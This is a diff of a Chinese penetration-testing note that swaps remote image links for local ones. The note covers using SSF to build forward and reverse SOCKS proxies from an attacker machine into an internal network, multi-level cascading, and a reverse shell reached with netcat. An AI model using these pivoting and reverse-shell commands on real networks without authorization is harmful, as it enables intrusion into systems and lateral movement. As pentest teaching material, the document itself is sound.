@@ -2,23 +2,23 @@
   #### 正向socks代理
 	边界机器执行：
 	>ssfd.exe -p 1080 linux执行：./ssfd -p 1080
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/350.png)
+![image](img/350.png)
 
 	攻击机执行：
 	>ssf.exe -D 12138 -p 1080 192.168.0.98(边界机器IP)
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/351.png)
+![image](img/351.png)
 
 	本机配置proxychain或proxifier
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/352.png)
+![image](img/352.png)
   #### 反向socks代理
 	攻击机执行：
 	>ssfd.exe -p 1080
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/353.png)
+![image](img/353.png)
 
 	内网机器执行：
 	>ssf.exe -F 12138 -p 1080 192.168.0.106(攻击机IP)
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/354.png)
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/355.png)
+![image](img/354.png)
+![image](img/355.png)
   #### 多级级联
 	多级内网机执行：
 	>ssfd.exe -p 1080 -c config.json
@@ -36,11 +36,11 @@
   #### 反弹shell
 	攻击机执行：
 	>ssfd.exe -p 1080 -c config.json
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/356.png)
+![image](img/356.png)
 
 	内网机器执行：
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/357.png)
+![image](img/357.png)
 
 	攻击机执行：
 	>nc 127.0.0.1 12138
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/358.png)
+![image](img/358.png)
